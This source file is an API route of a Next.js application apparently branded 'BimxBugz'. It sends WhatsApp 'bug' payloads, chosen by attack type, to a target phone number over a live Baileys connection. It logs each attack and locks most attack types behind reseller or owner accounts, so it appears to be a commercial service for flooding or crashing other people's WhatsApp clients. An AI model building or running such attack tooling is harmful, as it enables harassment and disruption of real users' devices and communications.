import { NextRequest, NextResponse } from "next/server";
import { db } from "@/db";
import { attackLogs } from "@/db/schema";
import { verifyToken } from "@/lib/auth";
import { BUG_PAYLOADS } from "@/lib/bugPayloads";

// Legacy endpoint - still supported for compatibility
// But primary is now /api/wa/send with REAL Baileys

export async function POST(req: NextRequest) {
  const auth = req.headers.get("authorization");
  if (!auth?.startsWith("Bearer ")) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  const payload = verifyToken(auth.slice(7));
  if (!payload) return NextResponse.json({ error: "Token tidak valid" }, { status: 401 });

  const { attackType, target, sessionData } = await req.json();

  if (!attackType || !target) {
    return NextResponse.json({ error: "Data tidak lengkap" }, { status: 400 });
  }

  if (payload.role === "user" && attackType !== "delay-attack") {
    return NextResponse.json({ error: "FITUR INI KHUSUS MEMBER RESELLER/OWNER. SILAKAN UPGRADE AKUNMU!" }, { status: 403 });
  }

  const attackFn = BUG_PAYLOADS[attackType];
  if (!attackFn) {
    return NextResponse.json({ error: "Tipe serangan tidak dikenal" }, { status: 400 });
  }

  // Try to use real WA if connected, else fallback to simulation log
  let realSent = false;
  try {
    const { getWAConnection, isWAConnected } = await import("@/lib/waManager");
    if (isWAConnected(`${payload.userId}`)) {
      const wa = getWAConnection(`${payload.userId}`);
      if (wa?.sock) {
        const cleanTarget = target.replace(/[^0-9]/g, "");
        const jid = `${cleanTarget}@s.whatsapp.net`;
        const payloads = attackFn();
        const msgs = Array.isArray(payloads) ? payloads : [payloads];
        for (const m of msgs.slice(0, 3)) { // limit to 3 for legacy to avoid spam
          try {
            await wa.sock.sendMessage(jid, { text: m.slice(0, 60000) }); // chunk to WA limit
            await new Promise(r => setTimeout(r, 500));
          } catch {}
        }
        realSent = true;
      }
    }
  } catch {}

  await db.insert(attackLogs).values({
    userId: payload.userId,
    username: payload.username,
    attackType,
    target,
    status: realSent ? "success-real" : "success-sim",
  });

  await new Promise((r) => setTimeout(r, 800));

  return NextResponse.json({
    success: true,
    message: "BimxBugz V1 menyatakan bahwa pengiriman bug anda Success dan insyaallah akan bekerja",
    credit: "BimxBugz By BimzOfficial, SIKIKKK AYAAAAA!!!",
    attackType,
    target,
    realWA: realSent,
    v2: true,
  });
}
